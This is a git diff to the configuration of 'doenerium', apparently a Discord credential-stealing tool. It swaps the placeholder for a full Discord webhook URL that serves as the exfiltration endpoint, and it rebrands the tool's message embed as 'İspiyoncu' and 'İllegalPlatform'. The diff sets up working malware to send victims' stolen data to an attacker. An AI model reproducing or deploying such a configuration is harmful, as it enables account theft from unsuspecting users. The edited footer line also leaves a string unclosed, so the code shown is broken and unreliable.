@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "REPLACE_ME",
+    webhook: "https://discord.com/api/webhooks/1180970811692175391/59pXdfk5Fnb6BAKDxBjS-sdjTIXZE0JjES0xLdZavHpT-EYTMYOD5IRAaJTyI3uj1hJi",
 
     logout: true,
     disable_qr_code: true,
@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "İspiyoncu",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `İllegalPlatform,
+            icon_url: "https://cdn.discordapp.com/attachments/1180940721457463296/1180975911944859659/photo_2022-06-18_20-46-51.jpg?ex=657f6086&is=656ceb86&hm=c0ae81af6bfad025195116e9c4ff98fa040f42f8ef46b9e0f5b1a2f53387037c&",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "illegalplatform.com",
+        avatar_url: "https://cdn.discordapp.com/attachments/1180940721457463296/1180975911944859659/photo_2022-06-18_20-46-51.jpg?ex=657f6086&is=656ceb86&hm=c0ae81af6bfad025195116e9c4ff98fa040f42f8ef46b9e0f5b1a2f53387037c&"
     },
 
     badges: {
